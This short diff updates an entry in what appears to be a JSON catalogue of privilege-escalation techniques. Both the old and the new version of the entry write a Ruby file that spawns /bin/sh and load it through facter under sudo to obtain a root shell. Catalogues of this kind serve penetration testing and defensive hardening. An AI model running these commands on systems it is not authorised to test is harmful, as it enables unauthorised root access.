@@ -9,7 +9,7 @@
     "sudo": [
       {
         
-        "code": "TF=$(mktemp -d)\necho 'exec(\"/bin/sh\")' > $TF/x.rb\nsudo FACTERLIB=$TF facter\n"
+        "code": "TF=$(mktemp -d)\necho 'exec(\"/bin/sh\")' > $TF/x.rb\nsudo facter --custom-dir=$TF x\n"
       }
     ]
   }
